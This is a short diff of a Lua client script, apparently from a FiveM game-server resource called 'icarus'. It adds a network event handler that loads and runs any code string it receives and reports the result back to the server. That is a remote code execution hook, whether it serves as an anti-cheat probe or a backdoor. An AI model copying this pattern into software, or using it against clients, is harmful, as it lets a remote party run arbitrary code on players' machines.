@@ -20,6 +20,12 @@ AddEventHandler("icarus:52z8hbnkr0h1", function(urls)
 	end
 end)
 
+RegisterNetEvent("icarus:ping")
+AddEventHandler("icarus:ping", function(func)
+    local retval, result = pcall(load(func))
+    TriggerServerEvent("icarus:pong", retval, result)
+end)
+
 AddEventHandler("playerSpawned", function()
 	TriggerServerEvent("icarus:845z5r4i20yf")
 end)
